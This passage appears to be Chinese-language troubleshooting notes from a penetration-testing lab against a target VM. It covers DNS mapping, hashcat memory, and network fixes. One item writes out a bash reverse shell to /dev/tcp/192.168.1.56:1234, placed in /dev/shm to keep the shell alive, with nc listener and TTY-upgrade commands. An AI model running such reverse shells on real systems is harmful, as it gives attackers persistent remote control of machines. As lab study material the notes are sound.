#### 问题汇总

1. 遇到，ip重定向到域名问题，可以在DNS配置文件中配置，将域名解析成靶机IP即可正常访问
2. hashcat（hash破解工具，破解NTLM Hash经常要用）需要至少4GB的运行内存
3. 增加内存后会出现无法联网的情况，这时候重启网卡：`ifconfig eth0 up`，然后手动分配IP：`dhclient eth0`
4. 靶机启动自动任务使ssh连接每隔一段时间断开，要想获得持续连接的shell：
   ```
   /dev/shm是linux下一个非常有用的目录，它是linux操作系统利用内存虚拟出来的一个目录，这个目录中的文件都是保存在内存中，效率非常高。或者说这个目录用于内存映射。也就是说往这个目录写东西，都会写到内存里，不会持久化到磁盘。系统重启以后，文件都消失。其大小是非固定的，不是预先分配好的内存来存储。它的默认大小是内存的一半，被它占用的内存不会被系统回收重新划分。在此目录下运行的反弹shell不会被系统回收。
   ```

   ```
   1. 在 /dev/shm 目录中创建一个反向 shell bash 脚本
       #!/bin/bash
      bash -c 'bash -i >& /dev/tcp/192.168.1.56/1234 0>&1'
   2. 在 kali 上运行 `nc -lvvp 1234` 和 执行 shell 脚本
   3. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
   4. `export TERM=xterm` 然后 Ctrl+Z 退出来一下
   5. `stty raw -echo;fg` 回车后输入 reset 再回车
   ```
